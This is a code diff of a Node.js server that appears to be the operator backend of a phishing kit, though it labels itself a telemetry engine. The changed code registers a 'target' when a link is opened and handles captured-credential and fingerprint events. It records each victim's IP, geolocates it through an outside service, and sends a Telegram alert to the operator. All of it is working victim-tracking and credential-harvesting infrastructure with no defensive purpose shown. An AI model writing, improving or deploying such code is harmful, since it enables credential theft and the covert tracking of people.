@@ -183,29 +183,37 @@ async function initDB() {
 initDB();
 
 // --- TELEMETRY ENGINE (HTTP + Socket) ---
-async function processTelemetry(packet, socket = null) {
+async function processTelemetry(packet, socket = null, reqIp = null) {
     try {
         const raw = JSON.parse(Buffer.from(packet.v, 'base64').toString());
         const { event, data } = raw;
+        if (!data || !data.logId) return;
+
         let log = await getLog(data.logId);
+        const ip = (socket ? (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address) : reqIp || data.ip || '0.0.0.0').replace('::ffff:', '');
+
+        if (!log && (event === 'join' || event === 'fingerprint' || event === 'creds' || event === 'capture_creds' || event === 'perf')) {
+            log = { id: data.logId, linkId: data.linkId || 'unknown', timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
+            await sendTelegramMsg(`🚨 *ALVO ABRIU O LINK*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
+            io.emit('new_click', log);
+            axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
+                if(r.data && !r.data.error) {
+                    log.geo = `${r.data.city}, ${r.data.country_name}`;
+                    log.lat = r.data.latitude; log.lon = r.data.longitude;
+                    await saveLog(log);
+                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
+                }
+            }).catch(()=>{});
+            await saveLog(log);
+        }
 
         if (event === 'join') {
-            const ip = (socket ? (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address) : data.ip || '0.0.0.0').replace('::ffff:', '');
-            if (!log) {
-                log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
-                await sendTelegramMsg(`🚨 *ALVO ABRIU O LINK*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
-                io.emit('new_click', log);
-                axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
-                    if(r.data && !r.data.error) {
-                        log.geo = `${r.data.city}, ${r.data.country_name}`;
-                        log.lat = r.data.latitude; log.lon = r.data.longitude;
-                        await saveLog(log);
-                        io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
-                    }
-                }).catch(()=>{});
-            } else { log.status = 'online'; log.timestamp = new Date(); }
-            await saveLog(log);
-            io.emit('update_log', { id: log.id, status: 'online' });
+            if (log) {
+                log.status = 'online';
+                log.timestamp = new Date();
+                await saveLog(log);
+                io.emit('update_log', { id: log.id, status: 'online' });
+            }
         } else if (log) {
             switch(event) {
                 case 'creds':
@@ -338,7 +346,8 @@ app.get('/api/vapid-public-key', async (req, res) => {
 });
 
 app.post('/api/telemetry', async (req, res) => {
-    if (req.body && req.body.v) await processTelemetry(req.body, null);
+    const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress).replace('::ffff:', '');
+    if (req.body && req.body.v) await processTelemetry(req.body, null, ip);
     res.json({ status: 'ok' });
 });
 
